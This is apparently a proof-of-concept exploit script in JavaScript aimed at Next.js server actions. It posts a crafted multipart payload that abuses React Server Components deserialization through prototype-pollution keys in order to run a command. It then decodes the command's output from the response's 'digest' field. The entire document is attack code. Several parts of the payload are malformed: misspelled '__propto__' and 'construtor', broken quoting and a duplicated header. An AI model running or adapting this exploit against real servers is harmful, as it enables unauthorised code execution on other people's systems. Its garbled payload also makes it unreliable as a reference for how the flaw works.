(async () => {
  const cmd = "echo vulnerability_test";
  const targetUrl = "/namaste";

  console.log(`[*] Attempting to run command: ${cmd}`);

  const payloadJson = `{"then":"$1:__propto__:then", "status":"resolved_model","reason": -1, "value": "{\\"then\\":\\"$B1337\\"}",","_response": {"_prefix:"console.log("meowmeow")//","_formData":{"get":"$1:construtor:constructor"}}}`;

  const boundary = "----WebKitFormBoundaryx8j02oVVc65WP35ad";

  const bodyParts = [
    payloadJson,
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    "",
    '"$@0"',
    `--${boundary}`,
    'Content-Disposition: form-data; name="2"',
    "",
    "[]",
    `--${boundary}--`,
    "",
  ].join("\r\n");

  try {
    // 3. Send the request
    const res = await fetch(targetUrl, {
      method: "POST",
      headers: {
        "Next-Action": "x", // Required to trigger Server Action logic
        "X-Nextjs-Request-Id": "7a3f9cle",
        "X-Nextjs-Html-Request-Id": "9bKZmPaRtWwXyZ3S@lsT7u",
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "X-Nextjs-Html-Request-Id": "SSTMXm70J_gMkx6jpQi0",
      },
      body: bodyParts,
    });

    const responseText = await res.text();

    // 4. Extract and Decode the output
    // The server returns the output inside the "digest" field
    const digestMatch = responseText.match(/"digest"\s*:\s*"([^"]+)"/);

    if (digestMatch && digestMatch[1]) {
      let rawBase64 = digestMatch[1];

      // Clean JSON escaping
      let cleanBase64 = JSON.parse(`"${rawBase64}"`);

      // Decode Base64 (handling UTF-8)
      const decodedStr = new TextDecoder().decode(
        Uint8Array.from(atob(cleanBase64), (c) => c.charCodeAt(0))
      );

      console.log(`[+] Decoded output: ${decodedStr}`);
      return decodedStr;
    } else {
      console.log(`[-] No digest field found in response`);
      console.log(`[*] Response status: ${res.status}`);
      console.log(`[*] Response preview: ${responseText.substring(0, 500)}`);
      return responseText;
    }
  } catch (error) {
    console.error(`[!] Error: ${error.message}`);
    return null;
  }
})();
